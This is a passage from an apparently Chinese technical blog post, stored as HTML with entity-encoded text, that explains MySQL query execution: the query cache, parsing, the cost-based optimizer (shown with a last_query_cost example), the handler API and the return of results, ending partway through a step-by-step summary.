&#x8BED;&#x53E5;&#x6C38;&#x8FDC;&#x4E0D;&#x4F1A;&#x547D;&#x4E2D;&#x7F13;&#x5B58;</li><li>&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x53EF;&#x4EE5;&#x88AB;&#x7F13;&#x5B58;&#xFF0C;&#x90A3;&#x4E48;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x4F1A;&#x5C06;&#x7ED3;&#x679C;&#x5B58;&#x5165;&#x7F13;&#x5B58;&#xFF0C;&#x4E5F;&#x4F1A;&#x5E26;&#x6765;&#x989D;&#x5916;&#x7684;&#x7CFB;&#x7EDF;&#x6D88;&#x8017;</li></ul><p>&#x57FA;&#x4E8E;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x77E5;&#x9053;&#x5E76;&#x4E0D;&#x662F;&#x4EC0;&#x4E48;&#x60C5;&#x51B5;&#x4E0B;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x90FD;&#x4F1A;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#xFF0C;&#x7F13;&#x5B58;&#x548C;&#x5931;&#x6548;&#x90FD;&#x4F1A;&#x5E26;&#x6765;&#x989D;&#x5916;&#x6D88;&#x8017;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x7F13;&#x5B58;&#x5E26;&#x6765;&#x7684;&#x8D44;&#x6E90;&#x8282;&#x7EA6;&#x5927;&#x4E8E;&#x5176;&#x672C;&#x8EAB;&#x6D88;&#x8017;&#x7684;&#x8D44;&#x6E90;&#x65F6;&#xFF0C;&#x624D;&#x4F1A;&#x7ED9;&#x7CFB;&#x7EDF;&#x5E26;&#x6765;&#x6027;&#x80FD;&#x63D0;&#x5347;&#x3002;&#x4F46;&#x8981;&#x5982;&#x4F55;&#x8BC4;&#x4F30;&#x6253;&#x5F00;&#x7F13;&#x5B58;&#x662F;&#x5426;&#x80FD;&#x591F;&#x5E26;&#x6765;&#x6027;&#x80FD;&#x63D0;&#x5347;&#x662F;&#x4E00;&#x4EF6;&#x975E;&#x5E38;&#x56F0;&#x96BE;&#x7684;&#x4E8B;&#x60C5;&#xFF0C;&#x4E5F;&#x4E0D;&#x5728;&#x672C;&#x6587;&#x8BA8;&#x8BBA;&#x7684;&#x8303;&#x7574;&#x5185;&#x3002;&#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x786E;&#x5B9E;&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x6027;&#x80FD;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x6253;&#x5F00;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x5E76;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0A;&#x505A;&#x4E00;&#x4E9B;&#x4F18;&#x5316;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;</p><ol><li>&#x7528;&#x591A;&#x4E2A;&#x5C0F;&#x8868;&#x4EE3;&#x66FF;&#x4E00;&#x4E2A;&#x5927;&#x8868;&#xFF0C;&#x6CE8;&#x610F;&#x4E0D;&#x8981;&#x8FC7;&#x5EA6;&#x8BBE;&#x8BA1;</li><li>&#x6279;&#x91CF;&#x63D2;&#x5165;&#x4EE3;&#x66FF;&#x5FAA;&#x73AF;&#x5355;&#x6761;&#x63D2;&#x5165;</li><li>&#x5408;&#x7406;&#x63A7;&#x5236;&#x7F13;&#x5B58;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x5176;&#x5927;&#x5C0F;&#x8BBE;&#x7F6E;&#x4E3A;&#x51E0;&#x5341;&#x5146;&#x6BD4;&#x8F83;&#x5408;&#x9002;</li><li>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;SQL_CACHE&#x548C;SQL_NO_CACHE&#x6765;&#x63A7;&#x5236;&#x67D0;&#x4E2A;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x662F;&#x5426;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x7F13;&#x5B58;</li></ol><p>&#x6700;&#x540E;&#x7684;&#x5FE0;&#x544A;&#x662F;&#x4E0D;&#x8981;&#x8F7B;&#x6613;&#x6253;&#x5F00;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x5199;&#x5BC6;&#x96C6;&#x578B;&#x5E94;&#x7528;&#x3002;&#x5982;&#x679C;&#x4F60;&#x5B9E;&#x5728;&#x662F;&#x5FCD;&#x4E0D;&#x4F4F;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;<code>query_cache_type</code>&#x8BBE;&#x7F6E;&#x4E3A;<code>DEMAND</code>&#xFF0C;&#x8FD9;&#x65F6;&#x53EA;&#x6709;&#x52A0;&#x5165;<code>SQL_CACHE</code>&#x7684;&#x67E5;&#x8BE2;&#x624D;&#x4F1A;&#x8D70;&#x7F13;&#x5B58;&#xFF0C;&#x5176;&#x4ED6;&#x67E5;&#x8BE2;&#x5219;&#x4E0D;&#x4F1A;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x975E;&#x5E38;&#x81EA;&#x7531;&#x5730;&#x63A7;&#x5236;&#x54EA;&#x4E9B;&#x67E5;&#x8BE2;&#x9700;&#x8981;&#x88AB;&#x7F13;&#x5B58;&#x3002;</p><p>&#x5F53;&#x7136;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;&#x672C;&#x8EAB;&#x662F;&#x975E;&#x5E38;&#x590D;&#x6742;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;&#x8BA8;&#x8BBA;&#x7684;&#x4E5F;&#x53EA;&#x662F;&#x5F88;&#x5C0F;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x5176;&#x4ED6;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x8BDD;&#x9898;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;&#x7F13;&#x5B58;&#x662F;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x5185;&#x5B58;&#x7684;&#xFF1F;&#x5982;&#x4F55;&#x63A7;&#x5236;&#x5185;&#x5B58;&#x7684;&#x788E;&#x7247;&#x5316;&#xFF1F;&#x4E8B;&#x52A1;&#x5BF9;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x6709;&#x4F55;&#x5F71;&#x54CD;&#x7B49;&#x7B49;&#xFF0C;&#x8BFB;&#x8005;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x9605;&#x8BFB;&#x76F8;&#x5173;&#x8D44;&#x6599;&#xFF0C;&#x8FD9;&#x91CC;&#x6743;&#x5F53;&#x629B;&#x7816;&#x5F15;&#x7389;&#x5427;&#x3002;</p><h4 id="&#x8BED;&#x6CD5;&#x89E3;&#x6790;&#x548C;&#x9884;&#x5904;&#x7406;"><a href="#&#x8BED;&#x6CD5;&#x89E3;&#x6790;&#x548C;&#x9884;&#x5904;&#x7406;" class="headerlink" title="&#x8BED;&#x6CD5;&#x89E3;&#x6790;&#x548C;&#x9884;&#x5904;&#x7406;"></a>&#x8BED;&#x6CD5;&#x89E3;&#x6790;&#x548C;&#x9884;&#x5904;&#x7406;</h4><p>MySQL &#x901A;&#x8FC7;&#x5173;&#x952E;&#x5B57;&#x5C06; SQL &#x8BED;&#x53E5;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x5E76;&#x751F;&#x6210;&#x4E00;&#x9897;&#x5BF9;&#x5E94;&#x7684;&#x89E3;&#x6790;&#x6811;&#x3002;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x89E3;&#x6790;&#x5668;&#x4E3B;&#x8981;&#x901A;&#x8FC7;&#x8BED;&#x6CD5;&#x89C4;&#x5219;&#x6765;&#x9A8C;&#x8BC1;&#x548C;&#x89E3;&#x6790;&#x3002;&#x6BD4;&#x5982; SQL &#x4E2D;&#x662F;&#x5426;&#x4F7F;&#x7528;&#x4E86;&#x9519;&#x8BEF;&#x7684;&#x5173;&#x952E;&#x5B57;&#x6216;&#x8005;&#x5173;&#x952E;&#x5B57;&#x7684;&#x987A;&#x5E8F;&#x662F;&#x5426;&#x6B63;&#x786E;&#x7B49;&#x7B49;&#x3002;&#x9884;&#x5904;&#x7406;&#x5219;&#x4F1A;&#x6839;&#x636E; MySQL &#x89C4;&#x5219;&#x8FDB;&#x4E00;&#x6B65;&#x68C0;&#x67E5;&#x89E3;&#x6790;&#x6811;&#x662F;&#x5426;&#x5408;&#x6CD5;&#x3002;&#x6BD4;&#x5982;&#x68C0;&#x67E5;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x8868;&#x548C;&#x6570;&#x636E;&#x5217;&#x662F;&#x5426;&#x5B58;&#x5728;&#x7B49;&#x7B49;&#x3002;</p><h4 id="&#x67E5;&#x8BE2;&#x4F18;&#x5316;"><a href="#&#x67E5;&#x8BE2;&#x4F18;&#x5316;" class="headerlink" title="&#x67E5;&#x8BE2;&#x4F18;&#x5316;"></a>&#x67E5;&#x8BE2;&#x4F18;&#x5316;</h4><p>&#x7ECF;&#x8FC7;&#x524D;&#x9762;&#x7684;&#x6B65;&#x9AA4;&#x751F;&#x6210;&#x7684;&#x8BED;&#x6CD5;&#x6811;&#x88AB;&#x8BA4;&#x4E3A;&#x662F;&#x5408;&#x6CD5;&#x7684;&#x4E86;&#xFF0C;&#x5E76;&#x4E14;&#x7531;&#x4F18;&#x5316;&#x5668;&#x5C06;&#x5176;&#x8F6C;&#x5316;&#x6210;&#x67E5;&#x8BE2;&#x8BA1;&#x5212;&#x3002;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E00;&#x6761;&#x67E5;&#x8BE2;&#x53EF;&#x4EE5;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x6267;&#x884C;&#x65B9;&#x5F0F;&#xFF0C;&#x6700;&#x540E;&#x90FD;&#x8FD4;&#x56DE;&#x76F8;&#x5E94;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x4F18;&#x5316;&#x5668;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x627E;&#x5230;&#x8FD9;&#x5176;&#x4E2D;&#x6700;&#x597D;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x3002;</p><p>MySQL &#x4F7F;&#x7528;&#x57FA;&#x4E8E;&#x6210;&#x672C;&#x7684;&#x4F18;&#x5316;&#x5668;&#xFF0C;&#x5B83;&#x5C1D;&#x8BD5;&#x9884;&#x6D4B;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;&#x67D0;&#x79CD;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x65F6;&#x7684;&#x6210;&#x672C;&#xFF0C;&#x5E76;&#x9009;&#x62E9;&#x5176;&#x4E2D;&#x6210;&#x672C;&#x6700;&#x5C0F;&#x7684;&#x4E00;&#x4E2A;&#x3002;&#x5728; MySQL &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x67E5;&#x8BE2;&#x5F53;&#x524D;&#x4F1A;&#x8BDD;&#x7684;last_query_cost&#x7684;&#x503C;&#x6765;&#x5F97;&#x5230;&#x5176;&#x8BA1;&#x7B97;&#x5F53;&#x524D;&#x67E5;&#x8BE2;&#x7684;&#x6210;&#x672C;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from t_message <span class="built_in">limit</span> 10;</span><br><span class="line">...&#x7701;&#x7565;&#x7ED3;&#x679C;&#x96C6;</span><br><span class="line"></span><br><span class="line">mysql&gt; show status like <span class="string">&apos;last_query_cost&apos;</span>;</span><br><span class="line">+-----------------+-------------+</span><br><span class="line">| Variable_name   | Value       |</span><br><span class="line">+-----------------+-------------+</span><br><span class="line">| Last_query_cost | 6391.799000 |</span><br><span class="line">+-----------------+-------------+</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x793A;&#x4F8B;&#x4E2D;&#x7684;&#x7ED3;&#x679C;&#x8868;&#x793A;&#x4F18;&#x5316;&#x5668;&#x8BA4;&#x4E3A;&#x5927;&#x6982;&#x9700;&#x8981;&#x505A; 6391 &#x4E2A;&#x6570;&#x636E;&#x9875;&#x7684;&#x968F;&#x673A;&#x67E5;&#x627E;&#x624D;&#x80FD;&#x5B8C;&#x6210;&#x4E0A;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#x3002;&#x8FD9;&#x4E2A;&#x7ED3;&#x679C;&#x662F;&#x6839;&#x636E;&#x4E00;&#x4E9B;&#x5217;&#x7684;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#x8BA1;&#x7B97;&#x5F97;&#x6765;&#x7684;&#xFF0C;&#x8FD9;&#x4E9B;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#x5305;&#x62EC;&#xFF1A;&#x6BCF;&#x5F20;&#x8868;&#x6216;&#x8005;&#x7D22;&#x5F15;&#x7684;&#x9875;&#x9762;&#x4E2A;&#x6570;&#x3001;&#x7D22;&#x5F15;&#x7684;&#x57FA;&#x6570;&#x3001;&#x7D22;&#x5F15;&#x548C;&#x6570;&#x636E;&#x884C;&#x7684;&#x957F;&#x5EA6;&#x3001;&#x7D22;&#x5F15;&#x7684;&#x5206;&#x5E03;&#x60C5;&#x51B5;&#x7B49;&#x7B49;&#x3002;</p><p>&#x6709;&#x975E;&#x5E38;&#x591A;&#x7684;&#x539F;&#x56E0;&#x4F1A;&#x5BFC;&#x81F4; MySQL &#x9009;&#x62E9;&#x9519;&#x8BEF;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF0C;&#x6BD4;&#x5982;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#x4E0D;&#x51C6;&#x786E;&#x3001;&#x4E0D;&#x4F1A;&#x8003;&#x8651;&#x4E0D;&#x53D7;&#x5176;&#x63A7;&#x5236;&#x7684;&#x64CD;&#x4F5C;&#x6210;&#x672C;&#xFF08;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x3001;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF09;&#x3001;MySQL &#x8BA4;&#x4E3A;&#x7684;&#x6700;&#x4F18;&#x8DDF;&#x6211;&#x4EEC;&#x60F3;&#x7684;&#x4E0D;&#x4E00;&#x6837;&#xFF08;&#x6211;&#x4EEC;&#x5E0C;&#x671B;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x5C3D;&#x53EF;&#x80FD;&#x77ED;&#xFF0C;&#x4F46; MySQL &#x53EA;&#x9009;&#x62E9;&#x5B83;&#x8BA4;&#x4E3A;&#x6210;&#x672C;&#x5C0F;&#x7684;&#xFF0C;&#x4F46;&#x6210;&#x672C;&#x5C0F;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x77ED;&#xFF09;&#x7B49;&#x7B49;&#x3002;</p><p>MySQL &#x7684;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#x5668;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x590D;&#x6742;&#x7684;&#x90E8;&#x4EF6;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x4E86;&#x975E;&#x5E38;&#x591A;&#x7684;&#x4F18;&#x5316;&#x7B56;&#x7565;&#x6765;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x6700;&#x4F18;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF1A;</p><ul><li>&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x8868;&#x7684;&#x5173;&#x8054;&#x987A;&#x5E8F;&#xFF08;&#x591A;&#x5F20;&#x8868;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x5E76;&#x4E0D;&#x4E00;&#x5B9A;&#x6309;&#x7167; SQL &#x4E2D;&#x6307;&#x5B9A;&#x7684;&#x987A;&#x5E8F;&#x8FDB;&#x884C;&#xFF0C;&#x4F46;&#x6709;&#x4E00;&#x4E9B;&#x6280;&#x5DE7;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5173;&#x8054;&#x987A;&#x5E8F;&#xFF09;</li><li>&#x4F18;&#x5316;MIN()&#x548C;MAX()&#x51FD;&#x6570;&#xFF08;&#x627E;&#x67D0;&#x5217;&#x7684;&#x6700;&#x5C0F;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x8BE5;&#x5217;&#x6709;&#x7D22;&#x5F15;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x67E5;&#x627E; B+Tree &#x7D22;&#x5F15;&#x6700;&#x5DE6;&#x7AEF;&#xFF0C;&#x53CD;&#x4E4B;&#x5219;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x5177;&#x4F53;&#x539F;&#x7406;&#x89C1;&#x4E0B;&#x6587;&#xFF09;</li><li>&#x63D0;&#x524D;&#x7EC8;&#x6B62;&#x67E5;&#x8BE2;&#xFF08;&#x6BD4;&#x5982;&#xFF1A;&#x4F7F;&#x7528; Limit &#x65F6;&#xFF0C;&#x67E5;&#x627E;&#x5230;&#x6EE1;&#x8DB3;&#x6570;&#x91CF;&#x7684;&#x7ED3;&#x679C;&#x96C6;&#x540E;&#x4F1A;&#x7ACB;&#x5373;&#x7EC8;&#x6B62;&#x67E5;&#x8BE2;&#xFF09;</li><li>&#x4F18;&#x5316;&#x6392;&#x5E8F;&#xFF08;&#x5728;&#x8001;&#x7248;&#x672C; MySQL &#x4F1A;&#x4F7F;&#x7528;&#x4E24;&#x6B21;&#x4F20;&#x8F93;&#x6392;&#x5E8F;&#xFF0C;&#x5373;&#x5148;&#x8BFB;&#x53D6;&#x884C;&#x6307;&#x9488;&#x548C;&#x9700;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x5B57;&#x6BB5;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5BF9;&#x5176;&#x6392;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6839;&#x636E;&#x6392;&#x5E8F;&#x7ED3;&#x679C;&#x53BB;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x884C;&#xFF0C;&#x800C;&#x65B0;&#x7248;&#x672C;&#x91C7;&#x7528;&#x7684;&#x662F;&#x5355;&#x6B21;&#x4F20;&#x8F93;&#x6392;&#x5E8F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4E00;&#x6B21;&#x8BFB;&#x53D6;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x884C;&#xFF0C;&#x7136;&#x540E;&#x6839;&#x636E;&#x7ED9;&#x5B9A;&#x7684;&#x5217;&#x6392;&#x5E8F;&#x3002;&#x5BF9;&#x4E8E; I/O &#x5BC6;&#x96C6;&#x578B;&#x5E94;&#x7528;&#xFF0C;&#x6548;&#x7387;&#x4F1A;&#x9AD8;&#x5F88;&#x591A;&#xFF09;</li></ul><p>&#x968F;&#x7740; MySQL &#x7684;&#x4E0D;&#x65AD;&#x53D1;&#x5C55;&#xFF0C;&#x4F18;&#x5316;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x4F18;&#x5316;&#x7B56;&#x7565;&#x4E5F;&#x5728;&#x4E0D;&#x65AD;&#x7684;&#x8FDB;&#x5316;&#xFF0C;&#x8FD9;&#x91CC;&#x4EC5;&#x4EC5;&#x4ECB;&#x7ECD;&#x51E0;&#x4E2A;&#x975E;&#x5E38;&#x5E38;&#x7528;&#x4E14;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x7684;&#x4F18;&#x5316;&#x7B56;&#x7565;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x4F18;&#x5316;&#x7B56;&#x7565;&#xFF0C;&#x5927;&#x5BB6;&#x81EA;&#x884C;&#x67E5;&#x9605;&#x5427;&#x3002;</p><h4 id="&#x67E5;&#x8BE2;&#x6267;&#x884C;&#x5F15;&#x64CE;"><a href="#&#x67E5;&#x8BE2;&#x6267;&#x884C;&#x5F15;&#x64CE;" class="headerlink" title="&#x67E5;&#x8BE2;&#x6267;&#x884C;&#x5F15;&#x64CE;"></a>&#x67E5;&#x8BE2;&#x6267;&#x884C;&#x5F15;&#x64CE;</h4><p>&#x5728;&#x5B8C;&#x6210;&#x89E3;&#x6790;&#x548C;&#x4F18;&#x5316;&#x9636;&#x6BB5;&#x4EE5;&#x540E;&#xFF0C;MySQL &#x4F1A;&#x751F;&#x6210;&#x5BF9;&#x5E94;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;&#xFF0C;&#x67E5;&#x8BE2;&#x6267;&#x884C;&#x5F15;&#x64CE;&#x6839;&#x636E;&#x6267;&#x884C;&#x8BA1;&#x5212;&#x7ED9;&#x51FA;&#x7684;&#x6307;&#x4EE4;&#x9010;&#x6B65;&#x6267;&#x884C;&#x5F97;&#x51FA;&#x7ED3;&#x679C;&#x3002;&#x6574;&#x4E2A;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x7684;&#x5927;&#x90E8;&#x5206;&#x64CD;&#x4F5C;&#x5747;&#x662F;&#x901A;&#x8FC7;&#x8C03;&#x7528;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x5B9E;&#x73B0;&#x7684;&#x63A5;&#x53E3;&#x6765;&#x5B8C;&#x6210;&#xFF0C;&#x8FD9;&#x4E9B;&#x63A5;&#x53E3;&#x88AB;&#x79F0;&#x4E3A;<code>handler API</code>&#x3002;&#x67E5;&#x8BE2;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x5F20;&#x8868;&#x7531;&#x4E00;&#x4E2A;<code>handler</code>&#x5B9E;&#x4F8B;&#x8868;&#x793A;&#x3002;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;MySQL &#x5728;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#x9636;&#x6BB5;&#x5C31;&#x4E3A;&#x6BCF;&#x4E00;&#x5F20;&#x8868;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;<code>handler</code>&#x5B9E;&#x4F8B;&#xFF0C;&#x4F18;&#x5316;&#x5668;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x8FD9;&#x4E9B;&#x5B9E;&#x4F8B;&#x7684;&#x63A5;&#x53E3;&#x6765;&#x83B7;&#x53D6;&#x8868;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x8868;&#x7684;&#x6240;&#x6709;&#x5217;&#x540D;&#x3001;&#x7D22;&#x5F15;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#x7B49;&#x3002;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x63A5;&#x53E3;&#x63D0;&#x4F9B;&#x4E86;&#x975E;&#x5E38;&#x4E30;&#x5BCC;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x5176;&#x5E95;&#x5C42;&#x4EC5;&#x6709;&#x51E0;&#x5341;&#x4E2A;&#x63A5;&#x53E3;&#xFF0C;&#x8FD9;&#x4E9B;&#x63A5;&#x53E3;&#x50CF;&#x642D;&#x79EF;&#x6728;&#x4E00;&#x6837;&#x5B8C;&#x6210;&#x4E86;&#x4E00;&#x6B21;&#x67E5;&#x8BE2;&#x7684;&#x5927;&#x90E8;&#x5206;&#x64CD;&#x4F5C;&#x3002;</p><h4 id="&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;"><a href="#&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;" class="headerlink" title="&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;"></a>&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;</h4><p>&#x67E5;&#x8BE2;&#x6267;&#x884C;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x9636;&#x6BB5;&#x5C31;&#x662F;&#x5C06;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x5373;&#x4F7F;&#x67E5;&#x8BE2;&#x4E0D;&#x5230;&#x6570;&#x636E;&#xFF0C;MySQL &#x4ECD;&#x7136;&#x4F1A;&#x8FD4;&#x56DE;&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x6BD4;&#x5982;&#x8BE5;&#x67E5;&#x8BE2;&#x5F71;&#x54CD;&#x5230;&#x7684;&#x884C;&#x6570;&#x4EE5;&#x53CA;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x7B49;&#x7B49;&#x3002;</p><p>&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x88AB;&#x6253;&#x5F00;&#x4E14;&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x53EF;&#x4EE5;&#x88AB;&#x7F13;&#x5B58;&#xFF0C;MySQL &#x4E5F;&#x4F1A;&#x5C06;&#x7ED3;&#x679C;&#x5B58;&#x653E;&#x5230;&#x7F13;&#x5B58;&#x4E2D;&#x3002;</p><p>&#x7ED3;&#x679C;&#x96C6;&#x8FD4;&#x56DE;&#x5BA2;&#x6237;&#x7AEF;&#x662F;&#x4E00;&#x4E2A;&#x589E;&#x91CF;&#x4E14;&#x9010;&#x6B65;&#x8FD4;&#x56DE;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x6709;&#x53EF;&#x80FD; MySQL &#x5728;&#x751F;&#x6210;&#x7B2C;&#x4E00;&#x6761;&#x7ED3;&#x679C;&#x65F6;&#xFF0C;&#x5C31;&#x5F00;&#x59CB;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x9010;&#x6B65;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x96C6;&#x4E86;&#x3002;&#x8FD9;&#x6837;&#x670D;&#x52A1;&#x7AEF;&#x5C31;&#x65E0;&#x987B;&#x5B58;&#x50A8;&#x592A;&#x591A;&#x7ED3;&#x679C;&#x800C;&#x6D88;&#x8017;&#x8FC7;&#x591A;&#x5185;&#x5B58;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x8BA9;&#x5BA2;&#x6237;&#x7AEF;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x83B7;&#x5F97;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x7ED3;&#x679C;&#x96C6;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x884C;&#x90FD;&#x4F1A;&#x4EE5;&#x4E00;&#x4E2A;&#x6EE1;&#x8DB3; &#x2460; &#x4E2D;&#x6240;&#x63CF;&#x8FF0;&#x7684;&#x901A;&#x4FE1;&#x534F;&#x8BAE;&#x7684;&#x6570;&#x636E;&#x5305;&#x53D1;&#x9001;&#xFF0C;&#x518D;&#x901A;&#x8FC7; TCP &#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x4F20;&#x8F93;&#xFF0C;&#x5728;&#x4F20;&#x8F93;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x53EF;&#x80FD;&#x5BF9; MySQL &#x7684;&#x6570;&#x636E;&#x5305;&#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x7136;&#x540E;&#x6279;&#x91CF;&#x53D1;&#x9001;&#x3002;</p><p>&#x56DE;&#x5934;&#x603B;&#x7ED3;&#x4E00;&#x4E0B; MySQL &#x6574;&#x4E2A;&#x67E5;&#x8BE2;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#xFF0C;&#x603B;&#x7684;&#x6765;&#x8BF4;&#x5206;&#x4E3A; 5 &#x4E2A;&#x6B65;&#x9AA4;&#xFF1A;</p><ol><li>&#x5BA2;&#x6237;&#x7AEF;&#x5411; MySQL &#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x4E00;&#x6761;&#x67E5;&#x8BE2;&#x8BF7;&#x6C42;</li><li>&#x670D;&#x52A1;&#x5668;&#x9996;&#x5148;&#x68C0;&#x67E5;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x5982;&#x679C;&#x547D;&#x4E2D;&#x7F13;&#x5B58;&#xFF0C;&#x5219;&#x7ACB;&#x523B;&#x8FD4;&#x56DE;&#x5B58;&#x50A8;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x5426;&#x5219;&#x8FDB;&#x5165;&#x4E0B;&#x4E00;&#x9636;&#x6BB5;</li><li>&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C; SQL &#x89E3;&#x6790;&#x3001;&#x9884;&#x5904;&#x7406;&#x3001;&#x518D;&#x7531;&#x4F18;&#x5316;&#x5668;&#x751F;&#x6210;&#x5BF9;&#x5E94;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;</li><li>MySQL 